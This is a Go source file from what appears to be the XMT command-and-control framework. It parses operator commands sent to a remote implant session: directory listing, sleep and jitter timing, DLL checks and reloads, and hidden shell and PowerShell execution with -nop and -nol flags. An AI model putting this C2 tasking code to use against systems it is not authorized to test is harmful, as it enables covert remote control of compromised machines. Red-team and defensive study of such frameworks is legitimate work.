package rest

import (
	"strconv"
	"strings"
	"time"

	"github.com/iDigitalFlame/xmt/c2"
	"github.com/iDigitalFlame/xmt/c2/task"
	"github.com/iDigitalFlame/xmt/c2/task/wintask"
	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

var (
	errInvalidCmd    = xerr.New("invalid session command")
	errInvalidSleep  = xerr.New("invalid sleep value")
	errInvalidJitter = xerr.New("invalid jitter value")
)

type boolean uint8
type tasklet struct {
	Filter *cmd.Filter `json:"filter"`
	Data   string      `json:"data"`
	Wait   boolean     `json:"wait"`
	Hide   boolean     `json:"hide"`
}

func jitter(s string) (int, error) {
	b := strings.ReplaceAll(strings.TrimSpace(s), "%", "")
	if len(b) == 0 {
		return 0, errInvalidJitter
	}
	d, err := strconv.ParseUint(b, 10, 8)
	if err != nil {
		return 0, err
	}
	if d > 100 {
		return 0, xerr.New("jitter value " + s + " is not valid")
	}
	return int(d), nil
}
func sleep(s string) (time.Duration, error) {
	v := strings.ToLower(strings.TrimSpace(s))
	if len(v) == 0 {
		return 0, errInvalidSleep
	}
	switch v[len(v)-1] {
	case 's', 'h', 'm':
	default:
		v += "s"
	}
	d, err := time.ParseDuration(v)
	if err != nil {
		return 0, err
	}
	if d < time.Second || d > time.Hour*24 {
		return 0, xerr.New("duration value " + d.String() + " is not valid")
	}
	return d, nil
}
func (b *boolean) UnmarshalJSON(d []byte) error {
	if len(d) == 0 {
		*b = 0
		return nil
	}
	if d[0] == '"' && len(d) >= 1 {
		switch d[1] {
		case '1', 'T', 't':
			*b = 2
			return nil
		case '0', 'F', 'f':
			*b = 1
			return nil
		}
		*b = 0
		return nil
	}
	switch d[0] {
	case '1', 'T', 't':
		*b = 2
		return nil
	case '0', 'F', 'f':
		*b = 1
		return nil
	}
	*b = 0
	return nil
}
func taskCmd(s *c2.Session, c string) (*c2.Job, error) {
	i := strings.IndexByte(c, 32)
	if i < 2 {
		return taskCmdSingle(s, c)
	}
	var (
		t, e = strings.ToLower(c[0:i]), strings.TrimSpace(c[i+1:])
		a    []string
		l    int
	)
	if len(t) == 0 {
		return nil, errInvalidCmd
	}
	for i := 0; i < len(e); i++ {
		if e[i] == 32 || e[i] == ',' {
			a = append(a, strings.TrimSpace(e[l:i]))
			l = i + 1
		}
	}
	if len(a) == 0 {
		a = []string{e}
	} else if l < len(e) {
		a = append(a, e[l:])
	}
	if len(a) == 0 {
		return nil, errInvalidCmd
	}
	switch t {
	case "ls":
		switch a[0] {
		case "-al", "-a", "-l":
			if len(a) == 1 {
				return s.Task(task.Ls(""))
			}
			if len(a) == 2 {
				return s.Task(task.Ls(a[1]))
			}
			return nil, errInvalidCmd
		default:
		}
		return s.Task(task.Ls(a[0]))
	case "cd":
		if len(a) > 1 {
			return nil, errInvalidCmd
		}
		return s.Task(task.Cwd(a[0]))
	case "chan":
		if len(a) == 0 {
			s.SetChannel(true)
		} else {
			switch strings.ToLower(a[0]) {
			case "enable", "true", "e", "t":
				s.SetChannel(true)
			default:
				s.SetChannel(false)
			}
		}
		return nil, nil
	case "sleep":
		if n := strings.IndexByte(a[0], '/'); n > 0 {
			var (
				w, v   = strings.ToLower(strings.TrimSpace(a[0][:n])), strings.TrimSpace(a[0][n+1:])
				d, err = sleep(w)
			)
			if err != nil {
				return nil, err
			}
			if len(v) == 0 {
				return s.SetSleep(d)
			}
			j, err := jitter(v)
			if err != nil {
				return nil, err
			}
			return s.SetDuration(d, j)
		}
		d, err := sleep(a[0])
		if err != nil {
			return nil, err
		}
		return s.SetSleep(d)
	case "jitter":
		j, err := jitter(a[0])
		if err != nil {
			return nil, err
		}
		return s.SetJitter(j)
	case "check_dll":
		if len(a) > 1 {
			return nil, errInvalidCmd
		}
		return s.Task(wintask.CheckDLL(a[0]))
	case "reload_dll":
		if len(a) > 1 {
			return nil, errInvalidCmd
		}
		return s.Task(wintask.ReloadDLL(a[0]))
	}
	return nil, errInvalidCmd
}
func taskExec(s *c2.Session, t *tasklet) (*c2.Job, error) {
	var p *task.Process
	switch t.Data[0] {
	case '.':
		p = &task.Process{Args: []string{"@SHELL@", t.Data[1:]}}
	case '$':
		p = &task.Process{Args: []string{"powershell.exe", "-nop", "-nol", "-c", t.Data[1:]}}
		if s.Device.OS != device.Windows {
			p.Args[0] = "pwsh"
		}
	default:
		p = &task.Process{Args: cmd.Split(t.Data)}
	}
	p.Filter = t.Filter
	p.Hide, p.Wait = t.Hide != 1, t.Wait != 1
	return s.Task(task.RunEx(p))
}
func taskCmdSingle(s *c2.Session, c string) (*c2.Job, error) {
	switch strings.ToLower(c) {
	case "ls":
		return s.Task(task.Ls(""))
	case "pwd":
		return s.Task(task.Pwd())
	case "chan":
		s.SetChannel(true)
		return nil, nil
	}
	return nil, errInvalidCmd
}
